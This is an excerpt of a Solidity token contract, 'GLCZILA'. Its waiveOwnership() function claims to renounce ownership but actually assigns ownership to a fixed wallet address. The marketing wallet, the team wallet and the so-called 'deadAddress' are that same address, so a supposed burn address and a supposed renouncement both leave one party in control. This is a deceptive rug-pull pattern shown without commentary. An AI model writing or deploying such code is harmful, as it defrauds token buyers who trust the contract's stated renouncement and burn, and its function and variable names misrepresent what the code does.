...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x8F02510D22923aF0eD9b7AF52F7506547b21C469));
        _owner = address(0x8F02510D22923aF0eD9b7AF52F7506547b21C469);
    }
...
contract GLCZILA is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GLCZILA";
    string private _symbol = "GLCZILA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8F02510D22923aF0eD9b7AF52F7506547b21C469);
    address payable public teamWalletAddress = payable(0x8F02510D22923aF0eD9b7AF52F7506547b21C469);
    address public immutable deadAddress = 0x8F02510D22923aF0eD9b7AF52F7506547b21C469;
